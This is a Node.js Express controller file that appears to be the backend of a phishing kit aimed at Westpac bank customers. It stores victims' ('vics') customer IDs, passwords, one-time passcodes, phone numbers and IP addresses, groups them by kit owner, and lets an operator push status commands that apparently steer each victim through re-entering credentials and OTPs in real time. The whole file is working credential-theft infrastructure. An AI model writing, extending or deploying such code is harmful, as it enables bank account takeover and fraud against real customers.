const Westpac = require("../models/westpacModel");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Westpac.find({ owner })
        .sort({ status: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await Westpac.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Westpac.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { customerId, password, uniqueid, owner, ip } = req.body;
    try {
        await Westpac.create({ uniqueid, customerId, password, status: 1, owner, ip });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400).send(error);
    }
};

const submitLoginAgain = async (req, res) => {
    const { customerId, password, uniqueid } = req.body;
    try {
        await Westpac.findOneAndUpdate({ uniqueid }, { customerId, password, status: 0 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await Westpac.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await Westpac.findOneAndUpdate({ uniqueid }, { telephone, status: 5 }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Westpac.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitTelephone,
    deleteEntry,
};
